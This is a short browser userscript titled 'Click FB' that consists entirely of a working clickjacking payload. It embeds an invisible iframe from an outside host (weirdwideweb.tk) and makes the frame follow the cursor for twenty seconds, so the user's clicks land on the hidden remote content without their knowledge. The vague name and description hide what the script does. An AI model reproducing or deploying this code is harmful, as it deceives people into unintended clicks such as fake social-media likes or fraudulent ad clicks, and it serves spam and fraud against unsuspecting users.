// ==UserScript==
// @name           Click FB
// @description    Click FB
//

// ==/UserScript==


(function(){
     
      var Xcord = 0,
      Ycord = 0,
      IE = document.all ? true : false;
     
      if (!IE) document.captureEvents(Event.MOUSEMOVE);
     
      var lbox = document.createElement('iframe');
      lbox.src = 'http://weirdwideweb.tk/bla468.php';
      lbox.scrolling = 'no';
      lbox.frameBorder = 0;
      lbox.allowTransparency = 'true';
      lbox.style.border = 0;
      lbox.style.overflow = 'hidden';
      lbox.style.cursor = 'pointer';
      lbox.style.width = '468px';
      lbox.style.height =  '60px';
      lbox.style.position = 'absolute';
      lbox.style.opacity = '0';
      document.getElementsByTagName('body')[0].appendChild(lbox);
     
      window.addEventListener('mousemove', mouseMove, false);
     
      setTimeout(function(){
        document.getElementsByTagName('body')[0].removeChild(lbox);
        window.removeEventListener('mousemove', mouseMove, false);
      }, 20000);
     
      function mouseMove(e) {
        if (IE) {
          Xcord = event.clientX + document.body.scrollLeft;
          Ycord = event.clientY + document.body.scrollTop;
        } else {
          Xcord = e.pageX;
          Ycord = e.pageY;
        }
       
        if (Xcord < 0) Xcord = 0;
        if (Ycord < 0) Ycord = 0;
       
        lbox.style.top = (Ycord - 2) + 'px';
        lbox.style.left = (Xcord - 25) + 'px';
       
        return true
      }
    })();
